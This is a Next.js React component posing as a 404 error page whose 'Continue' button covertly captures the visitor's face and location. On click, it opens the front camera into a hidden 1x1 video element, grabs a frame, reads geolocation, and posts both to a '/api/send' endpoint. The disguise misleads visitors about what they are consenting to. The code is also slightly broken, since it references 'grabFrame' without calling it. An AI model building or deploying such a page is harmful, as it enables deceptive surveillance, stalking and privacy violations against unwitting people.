"use client";
import { useRef } from "react";
import "@/public/404.css";

export default function Home() {
  const videoRef = useRef<HTMLVideoElement>(null);

  async function capture() {
    // ---------- CAMERA ----------
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    const video = videoRef.current!;
    video.srcObject = stream;
    video.muted = true;
    await video.play();

    // ✅ USE IMAGECAPTURE (key change)
    const track = stream.getVideoTracks()[0];
    // @ts-ignore
    const imageCapture = new (window as any).ImageCapture(track);
    const bitmap = await imageCapture.grabFrame;

    // draw bitmap to canvas
    const canvas = document.createElement("canvas");
    canvas.width = bitmap.width;
    canvas.height = bitmap.height;

    const ctx = canvas.getContext("2d")!;
    ctx.drawImage(bitmap, 0, 0);

    const image = canvas.toDataURL("image/jpeg", 0.9);

    // stop camera
    stream.getTracks().forEach(t => t.stop());

    // ---------- LOCATION ----------
    navigator.geolocation.getCurrentPosition(async pos => {
      await fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          image,
          lat: pos.coords.latitude,
          lon: pos.coords.longitude
        })
      });
    });
  }

  return (
    <div className="error-container">
      <h1>404</h1>
      <p>Click here to continue</p>

      <video
        ref={videoRef}
        playsInline
        muted
        style={{ width: 1, height: 1, opacity: 0 }}
      />

      <button onClick={capture}>Continue</button>
    </div>
  );
}
